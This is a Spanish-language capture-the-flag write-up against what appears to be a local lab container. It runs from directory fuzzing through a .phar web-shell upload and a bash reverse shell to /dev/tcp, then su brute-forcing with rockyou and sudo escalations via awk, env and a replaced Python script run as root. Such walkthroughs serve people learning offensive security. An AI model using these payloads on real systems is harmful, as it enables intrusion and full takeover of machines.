## Reconocimiento:

Puerto 80 : HTTP 

En la web hay un index.html de Apache normal, pero en el código dice que hay un directorio raro, así que hago fuzzing:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,sh,txt,html,js,php.back
```

Hay un /uploads y un /file_upload.php

La idea es subir una shell y lograr conexión, para eso intento subir un archivo test.php pero lo rechaza. Con pruebas la extensión .phar si la acepta, así que creo la shell:

```bash
# nano shell.phar
<?php
  system($_GET["cmd"]);
?>
```

Luego desde la URL mando la conexión:

Pongo a la escucha:

```bash
nc -nlvp 4444
```

```bash
http://172.17.0.2/uploads/cmd.phar?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/4444 <%261'
```

## Escaldada:

No hay nada critico, toca hacer fuerza bruta con esta herramienta a los usuarios desde dentro ya que no hay SSH:

https://github.com/Crisstianpd/su-force

Desde el host:

```bash
python3 -m http.server 80
```

Las traemos a la carpeta /tmp:

```bash
wget http://172.17.0.1/rockyou.txt
wget http://172.17.0.1/Linux-Su-Force.sh
chmod +x Linux-Su-Force.sh
```

Y pruebo con el usuario mario:

```bash
./Linux-Su-Force.sh mario rockyou.txt
```

Pass = password123

```bash
sudo -l
(julen) NOPASSWD: /usr/bin/awk
```

Uso GTFO Bins:

```bash
sudo -u julen /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

Listo somos julen

```bash
sudo -l
(iker) NOPASSWD /usr/bin/env
```

Otra vez GTFO Bins

```bash
sudo -u iker /usr/bin/env /bin/bash
```

Listo somos iker

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py
```

El script no tiene permisos de edición, pero si deja eliminarlo. Así se creo otro con el mismo nombre pero cambio el contenido:

 

```python
import os
os.system("/bin/bash")
```

Y lo ejecuto:

```bash
sudo /usr/bin/python3 /home/iker/geo_ip.py
```

Listo.
